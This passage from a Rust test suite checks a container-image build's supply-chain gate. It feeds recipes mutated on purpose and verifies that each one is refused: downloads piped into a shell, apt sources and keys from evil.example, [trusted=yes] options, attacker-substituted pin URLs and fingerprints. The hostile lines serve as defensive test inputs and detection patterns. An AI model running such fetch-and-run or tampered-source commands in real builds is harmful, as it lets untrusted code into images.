    assert!(
        parse_parent_inventory(&forked).is_err(),
        "accepted a fork signing with its own release workflow"
    );
    // A local-base record describes the recipe it is listed for: only the copied
    // extension example consumes the base extension, everything else the local
    // standard. The value is not decoration, so swapping it must fail the gate
    // even though the inventory alone still parses.
    let swapped = source.replacen(
        "\"local_base\": \"extension\"",
        "\"local_base\": \"standard\"",
        1,
    );
    assert_ne!(swapped, source, "the local-base mutation did not apply");
    let swapped_inventory = parse_parent_inventory(&swapped).unwrap();
    assert!(
        check_recipe_parents(&swapped_inventory, &recipes).is_err(),
        "accepted a local base that does not describe its recipe"
    );
    // Literal duplicate keys must fail in the raw text, not in a rebuilt map.
    let duplications: [(&str, String, String); 5] = [
        (
            "pin",
            format!("\"{DEBIAN_PIN}\": {{"),
            format!("\"{DEBIAN_PIN}\": {{}}, \"{DEBIAN_PIN}\": {{"),
        ),
        (
            "platform",
            "\"linux/amd64\": {".to_owned(),
            "\"linux/amd64\": {}, \"linux/amd64\": {".to_owned(),
        ),
        (
            "nested verification",
            "\"method\": \"hash-only\",".to_owned(),
            "\"method\": \"hash-only\", \"method\": \"hash-only\",".to_owned(),
        ),
        (
            "recipe entry",
            "\"stage\": \"recipe-contract-bin\",".to_owned(),
            "\"stage\": \"recipe-contract-bin\", \"stage\": \"recipe-contract-bin\",".to_owned(),
        ),
        (
            "apt gap record",
            "\"apt_open_gaps\": []".to_owned(),
            "\"apt_open_gaps\": [], \"apt_open_gaps\": []".to_owned(),
        ),
    ];
    for (label, needle, duplicated) in duplications {
        let text = source.replacen(&needle, &duplicated, 1);
        assert_ne!(
            text, source,
            "{label}: duplicate-key mutation did not apply"
        );
        let error = parse_parent_inventory(&text).expect_err("duplicate keys must be refused");
        assert!(error.contains("duplicate JSON key"), "{label}: {error}");
    }
}

#[test]
fn apt_sources_are_official_only_and_the_legacy_installs_stay_gone() {
    parse_parent_inventory(&read_text(PARENT_INVENTORY)).unwrap();
    let recipes = maintained_recipes();
    let shell = maintained_helper_sources();
    check_legacy_install_paths(&recipes, &shell).unwrap();
    let base = recipes["images/Dockerfile"].clone();
    let standard = recipes["images/standard/Dockerfile"].clone();
    let go_dev = recipes["examples/layers/go-dev/Dockerfile"].clone();

    // One row per spelling of the two removed instructions (#96). A recipe that
    // puts any of them back is refused whether it writes apt state, downloads the
    // keyring, executes the setup script or simply asks apt for the package.
    let legacy_rows: Vec<(&str, BTreeMap<String, String>, &str)> = vec![
        (
            "the NodeSource setup script re-added",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!("{base}RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"),
            ),
            APT_SOURCE_REFUSAL,
        ),
        (
            "the NodeSource apt repository re-added",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!(
                    "{base}RUN echo 'deb https://deb.nodesource.com/node_22.x nodistro main' > /opt/agent-vm/node.list\n"
                ),
            ),
            APT_SOURCE_REFUSAL,
        ),
        (
            "the GitHub CLI package repository re-added",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!(
                    "{base}RUN echo 'deb https://cli.github.com/packages stable main' > /opt/agent-vm/github-cli.list\n"
                ),
            ),
            APT_SOURCE_REFUSAL,
        ),
        (
            "the GitHub CLI keyring download re-added",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!(
                    "{base}RUN curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg > /opt/agent-vm/key.gpg\n"
                ),
            ),
            APT_SOURCE_REFUSAL,
        ),
        (
            "a sources.list.d/github-cli entry",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!(
                    "{base}RUN install -Dm 644 /tmp/gh.list /opt/agent-vm/sources.list.d/github-cli.list\n"
                ),
            ),
            APT_SOURCE_REFUSAL,
        ),
        (
            "nodejs through apt",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!("{base}RUN apt-get install -y --no-install-recommends nodejs\n"),
            ),
            "apt may not install nodejs",
        ),
        (
            "gh through apt",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!("{base}RUN apt-get install -y --no-install-recommends gh\n"),
            ),
            "apt may not install gh",
        ),
        (
            "npm through apt in the standard recipe",
            edited_recipe(
                &recipes,
                "images/standard/Dockerfile",
                &standard,
                &format!("{standard}RUN apt-get install -y npm\n"),
            ),
            "apt may not install npm",
        ),
    ];
    for (label, edited, expected) in legacy_rows {
        let error = check_legacy_install_paths(&edited, &shell)
            .expect_err(&format!("accepted a legacy install: {label}"));
        assert!(error.contains("#96"), "{label}: {error}");
        assert!(error.contains(expected), "{label}: {error}");
    }

    // A downloaded script may not reach a shell through a pipe, in any of the
    // spellings a reviewer might use; the interpreter is matched as a word, so a
    // download piped into `tee` or verified by `sha256sum` stays legal.
    for pipe in ["| bash -", "| sh", "| /bin/sh", "| sudo bash", "| dash"] {
        let edited = edited_recipe(
            &recipes,
            "images/Dockerfile",
            &base,
            &format!("{base}RUN curl -fsSL https://example.invalid/setup.sh {pipe}\n"),
        );
        let error = check_legacy_install_paths(&edited, &shell)
            .expect_err(&format!("accepted a piped script: {pipe}"));
        assert!(
            error.contains("may not be executed through a pipe"),
            "{pipe}: {error}"
        );
        assert!(error.contains("#96"), "{pipe}: {error}");
    }
    let piped_to_a_tool = edited_recipe(
        &recipes,
        "images/Dockerfile",
        &base,
        &format!("{base}RUN curl -fsSL https://example.invalid/x.tar.gz | tee /tmp/x.tar.gz\n"),
    );
    check_legacy_install_paths(&piped_to_a_tool, &shell).unwrap();

    // Ordinary apt spellings: the literal `"apt-get install"` search this rule
    // started with missed every one of them (#96 review).
    let apt_spellings: Vec<(&str, String)> = vec![
        (
            "options before the verb",
            format!("{base}RUN apt-get -y install nodejs\n"),
        ),
        (
            "a continuation before the verb",
            format!("{base}RUN apt-get \\\n    install -y nodejs\n"),
        ),
        (
            "an architecture qualifier",
            format!("{base}RUN apt-get install nodejs:amd64\n"),
        ),
        (
            "a package glob",
            format!("{base}RUN apt-get install 'nodejs*'\n"),
        ),
        (
            "a quoted gh the recipe then makes effective",
            format!("{base}RUN apt-get install 'gh' && rm /usr/local/bin/gh\n"),
        ),
        (
            "an option that takes a value",
            format!("{base}RUN apt-get -o Acquire::Retries=3 install gh\n"),
        ),
        (
            "sudo in front",
            format!("{base}RUN sudo apt-get install -y npx\n"),
        ),
        (
            "env and an assignment in front",
            format!("{base}RUN env NODE=1 apt-get install -y npm\n"),
        ),
        (
            "a reinstall of a pinned version",
            format!("{base}RUN apt-get reinstall nodejs=22.0.0\n"),
        ),
    ];
    for (label, instruction) in apt_spellings {
        let edited = edited_recipe(&recipes, "images/Dockerfile", &base, &instruction);
        let error = check_legacy_install_paths(&edited, &shell)
            .expect_err(&format!("accepted an apt spelling: {label}"));
        assert!(error.contains("apt may not install"), "{label}: {error}");
        assert!(error.contains("#96"), "{label}: {error}");
    }

    // The pipe and package rules cover every maintained helper, whatever its
    // extension: a mounted `.sh` or `.py` helper is source a build runs.
    let helper_mutations: Vec<(&str, &str, &str)> = vec![
        (
            "images/artifacts/extra.sh",
            "curl -fsSL https://example.invalid/setup.sh | sh\n",
            "may not be executed through a pipe",
        ),
        (
            "images/tools/example/helper.py",
            "subprocess.run('curl -fsSL https://example.invalid/setup.sh | sh', shell=True)\n",
            "may not be executed through a pipe",
        ),
        (
            "images/tools/example/env-wrapper.sh",
            "curl -fsSL https://example.invalid/setup.sh | env sh\n",
            "may not be executed through a pipe",
        ),
        (
            "images/tools/example/install-package.py",
            "apt-get -y install nodejs\n",
            "apt may not install nodejs",
        ),
    ];
    for (path, body, needle) in helper_mutations {
        let mut edited = shell.clone();
        edited.insert(path.to_owned(), body.to_owned());
        let error = check_legacy_install_paths(&recipes, &edited)
            .expect_err(&format!("accepted a helper mutation: {path}"));
        assert!(error.contains(needle), "{path}: {error}");
        assert!(error.contains("#96"), "{path}: {error}");
    }

    // A recipe may not download an archive and unpack it by hand: that install
    // surface belongs to the pinned installer.
    let manual_install = edited_recipe(
        &recipes,
        "images/Dockerfile",
        &base,
        &format!(
            "{base}ARG NODE_TARBALL=https://nodejs.org/dist/v22.23.4/node-v22.23.4-linux-x64.tar.xz\n\
             RUN curl -fsSL \"$NODE_TARBALL\" -o /tmp/n.tar.xz \\\n && tar -xf /tmp/n.tar.xz -C /usr/local\n"
        ),
    );
    let error = check_legacy_install_paths(&manual_install, &shell)
        .expect_err("accepted a hand-unpacked archive");
    assert!(error.contains("may not be unpacked by hand"), "{error}");

    let recipe_mutations: Vec<(&str, BTreeMap<String, String>, &str)> = vec![
        (
            "insecure apt flag",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!(
                    "{base}RUN apt-get install -y --allow-unauthenticated --no-install-recommends zsh\n"
                ),
            ),
            "insecure apt construction",
        ),
        (
            "new .sources in the standard recipe",
            edited_recipe(
                &recipes,
                "images/standard/Dockerfile",
                &standard,
                &format!(
                    "{standard}RUN echo 'Types: deb' > /etc/apt/sources.list.d/extra.sources\n"
                ),
            ),
            APT_SOURCE_REFUSAL,
        ),
        (
            "new .list in an example recipe",
            edited_recipe(
                &recipes,
                "examples/layers/go-dev/Dockerfile",
                &go_dev,
                &format!(
                    "{go_dev}RUN echo 'deb http://evil.example stable main' > /etc/apt/sources.list.d/evil.list\n"
                ),
            ),
            APT_SOURCE_REFUSAL,
        ),
        (
            "bare add-apt-repository",
            edited_recipe(
                &recipes,
                "images/standard/Dockerfile",
                &standard,
                &format!("{standard}RUN add-apt-repository ppa:evil/ppa\n"),
            ),
            "insecure apt construction",
        ),
        (
            "trusted=yes source option",
            edited_recipe(
                &recipes,
                "images/standard/Dockerfile",
                &standard,
                &format!(
                    "{standard}RUN echo 'deb [trusted=yes] http://evil.example stable main' > /etc/apt/sources.list.d/x.list\n"
                ),
            ),
            "insecure apt construction",
        ),
        (
            "insecure configuration write",
            edited_recipe(
                &recipes,
                "images/standard/Dockerfile",
                &standard,
                &format!(
                    "{standard}RUN echo 'Acquire::Check-Valid-Until \"false\";' > /etc/apt/apt.conf.d/99-valid\n"
                ),
            ),
            "insecure apt construction",
        ),
    ];
    for (label, edited, expected) in recipe_mutations {
        let error = check_legacy_install_paths(&edited, &shell)
            .expect_err(&format!("accepted an apt mutation: {label}"));
        assert!(error.contains(expected), "{label}: {error}");
        if expected != "insecure apt construction" {
            assert!(error.contains("#96"), "{label}: {error}");
        }
    }

    // One row per spelling the gate promises to refuse. The first two are the
    // review's probes: before these markers were folded tokens, `/etc/apt`
    // needed a trailing slash and `signed-by=` needed the one-line form, so a
    // deb822 source written from `/etc/apt` and a `COPY apt /etc/apt` both
    // passed. The rest are the same tokens spelled the way apt or a reviewer
    // might write them - the honest limit is that this is a static catch for
    // known spellings, not a shell parser.
    let source_spellings: Vec<(&str, String)> = vec![
        (
            "/etc/apt as a COPY destination",
            format!("{standard}COPY apt /etc/apt\n"),
        ),
        (
            "deb822 source and key from /etc/apt",
            format!(
                "{standard}RUN cd /etc/apt && printf 'Types: deb\\nURIs: https://evil.example/\\nSuites: s\\nComponents: main\\nSigned-By: /usr/share/keyrings/evil.gpg\\n' > sources.list.d/evil.sources && curl -fsSL https://evil.example/key.gpg > /usr/share/keyrings/evil.gpg\n"
            ),
        ),
        (
            "/etc/apt/keyrings destination",
            format!("{standard}RUN cp /tmp/evil.gpg /etc/apt/keyrings/evil.gpg\n"),
        ),
        (
            "sources.list outside /etc/apt",
            format!("{standard}RUN cp /tmp/evil.txt /opt/agent-vm/sources.list\n"),
        ),
        (
            ".sources suffix outside /etc/apt",
            format!("{standard}RUN cp /tmp/evil.txt /opt/agent-vm/evil.sources\n"),
        ),
        (
            "Signed_By separator",
            format!(
                "{standard}RUN printf 'Signed_By: /tmp/evil.gpg\\n' > /opt/agent-vm/key.conf\n"
            ),
        ),
        (
            "trusted.gpg store",
            format!("{standard}RUN cp /tmp/evil.gpg /opt/agent-vm/trusted.gpg\n"),
        ),
        (
            "/usr/share/keyrings destination",
            format!("{standard}RUN cp /tmp/evil.gpg /usr/share/keyrings/evil.gpg\n"),
        ),
        (
            "URIs: field",
            format!(
                "{standard}RUN printf 'URIs: https://evil.example/\\n' >> /opt/agent-vm/extra\n"
            ),
        ),
        (
            "Types: deb field",
            format!("{standard}RUN printf 'Types: deb\\n' >> /opt/agent-vm/extra\n"),
        ),
        (
            "Dir::Etc override",
            format!(
                "{standard}RUN printf 'Dir::Etc::SourceParts \"/opt/evil/\";\\n' > /opt/agent-vm/apt.conf\n"
            ),
        ),
        (
            "apt-config dump",
            format!("{standard}RUN apt-config dump > /opt/agent-vm/apt.conf\n"),
        ),
    ];
    for (label, edited) in source_spellings {
        let mut source = recipes.clone();
        source.insert("images/standard/Dockerfile".to_owned(), edited);
        let error = check_legacy_install_paths(&source, &shell)
            .expect_err(&format!("accepted an apt source spelling: {label}"));
        assert!(error.contains(APT_SOURCE_REFUSAL), "{label}: {error}");
    }

    let script_mutations: Vec<(&str, String, &str)> = vec![
        (
            "apt-key in a maintained script",
            "curl -fsSL https://example.invalid/key.asc | apt-key add -\n".to_owned(),
            "insecure apt construction",
        ),
        (
            "new source write in a maintained script",
            "echo 'deb http://evil.example stable main' > /etc/apt/sources.list.d/evil.list\n"
                .to_owned(),
            APT_SOURCE_REFUSAL,
        ),
        (
            "external setup endpoint in a maintained script",
            "curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n".to_owned(),
            APT_SOURCE_REFUSAL,
        ),
        (
            "GitHub CLI keyring in a maintained script",
            "curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg > /opt/agent-vm/githubcli-archive-keyring.gpg\n"
                .to_owned(),
            APT_SOURCE_REFUSAL,
        ),
        (
            "apt configuration directory override in a maintained script",
            "printf 'Dir::Etc::SourceParts \"/opt/evil/\";\\n' > /etc/apt/apt.conf.d/99-evil\n"
                .to_owned(),
            APT_SOURCE_REFUSAL,
        ),
    ];
    for (label, body, expected) in script_mutations {
        let mut edited = shell.clone();
        edited.insert("images/tools/example/install-example.sh".to_owned(), body);
        let error = check_legacy_install_paths(&recipes, &edited)
            .expect_err(&format!("accepted a shell mutation: {label}"));
        assert!(error.contains(expected), "{label}: {error}");
    }
    // Comments are documentation, not behavior: the shipped apt configuration
    // explains apt-get itself and must not need an exemption.
    let mut commented = BTreeMap::new();
    commented.insert(
        "images/tools/example/notes.sh".to_owned(),
        "# apt-key add, deb http://deb.debian.org/debian and /etc/apt/sources.list\nset -eu\n"
            .to_owned(),
    );
    check_legacy_install_paths(&recipes, &commented).unwrap();
}

#[test]
fn artifact_pins_select_exact_identities_for_both_platforms() {
    let manifest = base_input_manifest_paths();
    for (name, path) in ARTIFACT_PINS {
        let pin = parse_artifact_pin(name, &read_text(path))
            .unwrap_or_else(|error| panic!("{path}: {error}"));
        assert_eq!(pin.name, name);
        assert!(
            is_exact_version(&pin.version),
            "{path}: an exact X.Y.Z version"
        );
        assert_eq!(
            pin.archives.keys().map(String::as_str).collect::<Vec<_>>(),
            PLATFORMS.to_vec(),
            "{path}: exactly the two supported platforms"
        );
        for (platform, archive) in &pin.archives {
            assert!(
                archive.url.starts_with("https://"),
                "{path}: {platform} url"
            );
            assert!(
                is_lower_hex(&archive.digest, 64),
                "{path}: {platform} digest"
            );
            assert!(
                archive.url.contains(platform_token(name, platform)),
                "{path}: {platform} url must name its architecture"
            );
            assert_eq!(
                archive.archive,
                if name == "node" { "tar.xz" } else { "tar.gz" },
                "{path}: {platform} archive kind"
            );
        }
        for evidence in artifact_evidence_paths(&pin) {
            let listed = format!("artifacts/{evidence}");
            assert!(
                manifest.contains(&listed),
                "the base input manifest must list {listed}: that is what binds the committed \
                 evidence bytes to the build"
            );
            assert!(
                !read_text(&format!("images/{listed}")).is_empty(),
                "{listed} must not be empty"
            );
        }
        match &pin.authentication {
            ArtifactAuthentication::OpenPgp {
                key_path,
                fingerprint,
                verified_on,
                ..
            } => {
                assert_eq!(name, "node", "only Node has a signed manifest");
                assert_eq!(fingerprint, NODE_RELEASE_FINGERPRINT);
                assert_eq!(key_path, NODE_RELEASE_KEY);
                assert!(is_date(verified_on));
                assert!(
                    read_text(&format!("images/artifacts/{key_path}"))
                        .starts_with("-----BEGIN PGP PUBLIC KEY BLOCK-----"),
                    "the committed node release key must be an ASCII-armoured public key"
                );
            }
            ArtifactAuthentication::Sigstore {
                policy, evidence, ..
            } => {
                assert_eq!(name, "gh", "only the GitHub CLI is attested");
                for (key, expected) in GH_SIGSTORE_POLICY {
                    assert_eq!(policy[key], expected, "gh policy {key}");
                }
                assert_eq!(policy["deny_self_hosted_runners"], "true");
                assert!(!evidence.is_empty(), "gh authentication cites evidence");
                for archive in pin.archives.values() {
                    let (bundle, _) = archive
                        .bundle
                        .as_ref()
                        .expect("the gh pin carries a bundle per platform");
                    let raw = read_text(&format!("images/artifacts/{bundle}"));
                    let first = raw.lines().next().expect("a bundle is one JSON line");
                    let value = strict_json(first).expect("the committed bundle is JSON");
                    let members = object(&value, "sigstore bundle").unwrap();
                    assert!(members.contains_key("verificationMaterial"), "{bundle}");
                    assert!(members.contains_key("dsseEnvelope"), "{bundle}");
                }
            }
        }
        assert_eq!(
            label_value(
                &read_text("images/Dockerfile"),
                &format!("{ARTIFACT_LABEL_PREFIX}{name}")
            ),
            pin.version,
            "the base image must label the version the pin selects"
        );
        if name == "node" {
            assert!(
                pin.links
                    .contains(&("/usr/bin/node".to_owned(), "/usr/local/bin/node".to_owned())),
                "the pinned interpreter path /usr/bin/node must stay a link to the artifact"
            );
            for entry in ["bin", "lib", "share"] {
                assert!(
                    pin.payload.contains(&entry.to_owned()),
                    "the node payload is the whole reviewed archive, {entry} included"
                );
            }
        }
    }
}

#[test]
fn artifact_pin_mutations_are_refused() {
    for (name, path) in ARTIFACT_PINS {
        let source = read_text(path);
        let pin = parse_artifact_pin(name, &source).unwrap();
        let amd64 = pin.archives["linux/amd64"].digest.clone();
        let url = pin.archives["linux/amd64"].url.clone();
        let version = pin.version.clone();
        let prefix = pin.archives["linux/amd64"].member_prefix.clone();
        let other = platform_token(name, "linux/arm64");
        let origin = if name == "node" {
            "https://nodejs.org/dist"
        } else {
            "https://github.com/cli/cli/releases/download"
        };
        // One row per field the gate promises to refuse, with the refusal it has
        // to be: an assertion that accepts any nonempty error cannot tell a
        // mutation of the intended field from one that hit another.
        let mut rows: Vec<(String, String, String, &'static str)> = vec![
            (
                "unknown field".to_owned(),
                "\"kind\":".to_owned(),
                "\"sort\":".to_owned(),
                "expected exactly",
            ),
            (
                "schema bump".to_owned(),
                "\"schema\": 1".to_owned(),
                "\"schema\": 2".to_owned(),
                "unsupported artifact pin schema",
            ),
            (
                "missing platform".to_owned(),
                "\"linux/arm64\": {".to_owned(),
                "\"linux/armv8\": {".to_owned(),
                "exactly the amd64 and arm64 platforms",
            ),
            (
                "inexact version".to_owned(),
                format!("\"version\": \"{version}\""),
                "\"version\": \"latest\"".to_owned(),
                "exact X.Y.Z",
            ),
            (
                "short digest".to_owned(),
                format!("\"sha256\": \"{amd64}\""),
                format!("\"sha256\": \"{}\"", &amd64[..32]),
                "lower-case SHA-256",
            ),
            (
                "upper-case digest".to_owned(),
                format!("\"sha256\": \"{amd64}\""),
                format!("\"sha256\": \"{}\"", amd64.to_uppercase()),
                "lower-case SHA-256",
            ),
            (
                "traversal in the url".to_owned(),
                url.clone(),
                format!("{origin}/v{version}/../../../attacker/repo/{version}/").to_owned()
                    + url.rsplit('/').next().unwrap(),
                "url must be exactly",
            ),
            (
                "lookalike host in the url".to_owned(),
                url.clone(),
                url.replace(origin, &format!("{origin}.evil")),
                "url must be exactly",
            ),
            (
                "extra path segment in the url".to_owned(),
                url.clone(),
                format!(
                    "{origin}/v{version}/extra/{}",
                    url.rsplit('/').next().unwrap()
                ),
                "url must be exactly",
            ),
            (
                "query string in the url".to_owned(),
                url.clone(),
                format!("{url}?raw=1"),
                "url must be exactly",
            ),
            (
                "another repository in the url".to_owned(),
                url.clone(),
                format!("{origin}/attacker/repo/{}", url.rsplit('/').next().unwrap()),
                "url must be exactly",
            ),
            (
                "wrong architecture in the url".to_owned(),
                url.clone(),
                url.replace(platform_token(name, "linux/amd64"), other),
                "url must be exactly",
            ),
            (
                "member prefix that no filename derives from".to_owned(),
                format!("\"member_prefix\": \"{prefix}\""),
                format!("\"member_prefix\": \"{prefix}extra/\""),
                "member_prefix must be",
            ),
            (
                "payload escaping the destination".to_owned(),
                "\"payload\": [".to_owned(),
                "\"payload\": [\"../escape\",".to_owned(),
                "payload entry must be relative",
            ),
            (
                "destination outside /usr/local".to_owned(),
                "\"destination\": \"/usr/local\"".to_owned(),
                "\"destination\": \"/usr\"".to_owned(),
                "destination must be /usr/local",
            ),
            (
                "authentication deleted".to_owned(),
                "\"authentication\": {".to_owned(),
                "\"authentication-removed\": {".to_owned(),
                "expected exactly",
            ),
        ];
        if name == "node" {
            let bundled = pin
                .bundled
                .clone()
                .expect("the node pin records the bundled npm");
            rows.push((
                "bundled npm missing".to_owned(),
                "\"bundled\": {".to_owned(),
                "\"bundled-removed\": {".to_owned(),
                "expected exactly",
            ));
            rows.push((
                "bundled npm with a floating version".to_owned(),
                format!("\"npm\": \"{bundled}\""),
                "\"npm\": \"^10\"".to_owned(),
                "exact X.Y.Z",
            ));
            rows.push((
                "attacker key substituted".to_owned(),
                NODE_RELEASE_FINGERPRINT.to_owned(),
                "0000000000000000000000000000000000000000".to_owned(),
                "fingerprint must be the reviewed",
            ));
            rows.push((
                "signature method downgraded".to_owned(),
                "\"method\": \"openpgp-signed-manifest\"".to_owned(),
                "\"method\": \"hash-only\"".to_owned(),
                "openpgp-signed-manifest",
            ));
            rows.push((
                "key file renamed".to_owned(),
                format!("\"path\": \"{NODE_RELEASE_KEY}\""),
                "\"path\": \"attacker-key.asc\"".to_owned(),
                "node key path must be",
            ));
            rows.push((
                "manifest outside the dist origin".to_owned(),
                format!("https://nodejs.org/dist/v{version}/SHASUMS256.txt"),
                format!("https://nodejs.org.evil/dist/v{version}/SHASUMS256.txt"),
                "node manifest url must be the nodejs.org dist origin",
            ));
        } else {
            let bundle = pin.archives["linux/amd64"]
                .bundle
                .as_ref()
                .expect("gh pins a bundle");
            rows.push((
                "attestation method downgraded".to_owned(),
                "\"method\": \"sigstore-attestation\"".to_owned(),
                "\"method\": \"hash-only\"".to_owned(),
                "sigstore-attestation",
            ));
            rows.push((
                "foreign signer workflow".to_owned(),
                "cli/cli/.github/workflows/deployment.yml".to_owned(),
                "attacker/cli/.github/workflows/deployment.yml".to_owned(),
                "gh policy signer_workflow must be",
            ));
            rows.push((
                "self-hosted runners accepted".to_owned(),
                "\"deny_self_hosted_runners\": true".to_owned(),
                "\"deny_self_hosted_runners\": false".to_owned(),
                "deny self-hosted runners",
            ));
            rows.push((
                "bundle path renamed".to_owned(),
                format!("\"path\": \"{}\"", bundle.0),
                "\"path\": \"gh-bundle.jsonl\"".to_owned(),
                "bundle must be",
            ));
            rows.push((
                "bundle digest upper-cased".to_owned(),
                format!("\"sha256\": \"{}\"", bundle.1),
                format!("\"sha256\": \"{}\"", bundle.1.to_uppercase()),
                "bundle sha256 must be a lower-case SHA-256",
            ));
        }
        let mut applied = 0;
        for (label, from, to, needle) in rows {
            let edited = source.replacen(&from, &to, 1);
            if edited == source {
                panic!("{name}: {label}: mutation did not apply");
            }
            let error = parse_artifact_pin(name, &edited)
                .expect_err(&format!("{name}: accepted a pin mutation: {label}"));
            assert!(
                error.contains(needle),
                "{name}: {label}: the refusal does not name the rule ({needle}): {error}"
            );
            applied += 1;
        }
        assert!(applied >= 16, "{name}: the mutation table stays broad");
    }
}

#[test]
fn the_base_recipe_installs_the_pinned_artifacts_through_the_installer() {
    let base = read_text("images/Dockerfile");
    let run = artifact_install_run(&base).expect("the base recipe installs both artifacts");
    assert!(
        run.contains("$TARGETARCH"),
        "the arch token comes from the build"
    );
    assert!(
        base.lines().any(|line| line.trim() == "ARG TARGETARCH"),
        "the base stage must declare TARGETARCH"
    );
    for (name, path) in ARTIFACT_PINS {
        let pin = parse_artifact_pin(name, &read_text(path)).unwrap();
        assert_eq!(
            label_value(&base, &format!("{ARTIFACT_LABEL_PREFIX}{name}")),
            pin.version,
            "{name}: the label must equal the pin"
        );
    }
    // The removed instructions are gone in every spelling, and the base no
    // longer fetches a third-party keyring, writes an apt source or pipes a
    // setup script into a shell.
    for needle in [
        "nodesource",
        "setup_22.x",
        "cli.github.com",
        "githubcli-archive-keyring",
        "sources.list.d/github-cli",
        "| bash",
    ] {
        assert!(
            !base.to_lowercase().contains(&needle.to_lowercase()),
            "images/Dockerfile still contains {needle}"
        );
    }
    let installer_mount = "--mount=type=bind,source=install-artifact.sh,target=/tmp/artifact-source/install-artifact.sh,ro \\\n";
    let mutations: Vec<(&str, String)> = vec![
        ("installer mount removed", base.replace(installer_mount, "")),
        (
            "pin mount removed",
            base.replace(
                "    --mount=type=bind,source=artifacts,target=/tmp/artifact-source/artifacts,ro \\\n",
                "",
            ),
        ),
        (
            "artifact pinned to one architecture",
            base.replace(
                "artifacts/gh.json \"$TARGETARCH\"",
                "artifacts/gh.json \"amd64\"",
            ),
        ),
        (
            "pin read from outside the mounts",
            base.replace(
                "artifacts/node.json \"$TARGETARCH\"",
                "/tmp/node.json \"$TARGETARCH\"",
            ),
        ),
        (
            "one artifact dropped",
            base.replace("install-artifact.sh gh \\\n", "install-artifact.sh tool \\\n"),
        ),
    ];
    for (label, edited) in mutations {
        if edited == base {
            panic!("the recipe mutation did not apply: {label}");
        }
        assert!(
            artifact_install_run(&edited).is_err(),
            "accepted a recipe mutation: {label}"
        );
    }
}

fn edited_recipe(
    recipes: &BTreeMap<String, String>,
    path: &str,
    from: &str,
    to: &str,
) -> BTreeMap<String, String> {
    let mut edited = recipes.clone();
    let changed = recipes[path].replace(from, to);
    assert_ne!(changed, recipes[path], "mutation did not apply to {path}");
    edited.insert(path.to_owned(), changed);
    edited
}

#[test]
fn from_parsing_keeps_raw_and_resolved_forms() {
    let inventory = parse_parent_inventory(&read_text(PARENT_INVENTORY)).unwrap();
    let base = parse_froms(&read_text("images/Dockerfile")).unwrap();
    assert_eq!(base.len(), 2);
    assert_eq!(base[0].stage.as_deref(), Some("recipe-contract-bin"));
    assert_eq!(base[0].platform.as_deref(), Some("$BUILDPLATFORM"));
    // A documented `refresh-parent-pins.sh golang-builder golang:VERSION-trixie`
    // moves the pin and the FROM together, so bind the parsed raw form to the
    // inventory instead of to the toolchain that happens to be reviewed now.
    assert_eq!(
        base[0].raw_image,
        inventory.pins[GO_PIN].reference().text(),
        "the builder FROM must be the pinned Go parent"
    );
    assert_eq!(base[0].raw_image, base[0].resolved_image);
    assert_eq!(
        base[1].raw_image,
        inventory.pins[DEBIAN_PIN].reference().text(),
        "the base FROM must be the pinned Debian parent"
    );
    assert_eq!(
        base[1].raw_image, base[1].resolved_image,
        "a literal FROM resolves to itself"
    );
    let standard = parse_froms(&read_text("images/standard/Dockerfile")).unwrap();
    let last = standard.last().unwrap();
    assert_eq!(last.raw_image, "${BASE_IMAGE}");
    assert_eq!(last.resolved_image, LOCAL_BASE);
    let extension = parse_froms(&read_text("examples/base-extension/Dockerfile")).unwrap();
    assert_eq!(
        extension[0].raw_image, "${BASE_IMAGE}",
        "the extension takes its base from the documented ARG"
    );
    assert_eq!(extension[0].resolved_image, LOCAL_BASE);
    let joined = parse_froms(
        "ARG BASE_IMAGE=agent-vm-base:local\n\
         FROM --platform=$BUILDPLATFORM golang:0.0.0-trixie \\\n    AS builder\n\
         # comment between instructions\n\
         FROM ${BASE_IMAGE}\n",
    )
    .unwrap();
    assert_eq!(joined.len(), 2);
    assert_eq!(joined[0].stage.as_deref(), Some("builder"));
    assert_eq!(joined[1].resolved_image, LOCAL_BASE);
    let stage_local = parse_froms(
        "ARG BASE_IMAGE=agent-vm-base:local\nFROM ${BASE_IMAGE}\nARG BASE_IMAGE=somewhere:else\n",
    )
    .unwrap();
    assert_eq!(
        stage_local[0].resolved_image, LOCAL_BASE,
        "a stage-local ARG is not the global default"
    );
    for bad in [
        "FROM ${BASE_IMAGE}\n",
        "FROM ${BASE_IMAGE:-agent-vm-base:local}\n",
        "FROM pre${BASE_IMAGE}\n",
        "ARG BASE_IMAGE\nFROM ${BASE_IMAGE}\n",
    ] {
        assert!(
            parse_froms(bad).is_err(),
            "accepted an unresolved FROM: {bad}"
        );
    }
}

/// Ordinary builds never invoke the maintenance path: no maintained recipe or
/// installer, build entrypoint or workflow may resolve parents or call the
/// refresher. Documentation may describe the maintenance commands; the test and
/// maintenance sources are the ones that implement them.
#[test]
fn no_build_path_refreshes_parent_pins() {
    let mut scanned = 0;
    let mut offenders = Vec::new();
    let mut build_sources = maintained_recipes();
    build_sources.extend(repository_files("script/release", None, Some("py")));
    build_sources.extend(repository_files("images", None, Some("sh")));
    for (relative, source) in build_sources {
        for needle in ["refresh-parent-pins", "imagetools inspect"] {
            if source.contains(needle) {
                offenders.push(format!("{relative}: {needle}"));
            }
        }
        scanned += 1;
    }
    for (relative, source) in repository_files("script/build", None, Some("sh")) {
        for needle in ["refresh-parent-pins", "imagetools inspect"] {
            if source.contains(needle) {
                offenders.push(format!("{relative}: {needle}"));
            }
        }
        scanned += 1;
    }
    // The native CI entrypoints build images too, so they are build paths in the
    // plan's sense even though they live with the tests and under script/ci.
    let mut entrypoints = repository_files("script/test", Some("ci-native.sh"), None);
    entrypoints.extend(repository_files("script/ci", None, Some("sh")));
    assert!(
        entrypoints.contains_key("script/test/ci-native.sh") && entrypoints.len() > 1,
        "the maintenance scan missed the native CI entrypoints: {:?}",
        entrypoints.keys().collect::<Vec<_>>()
    );
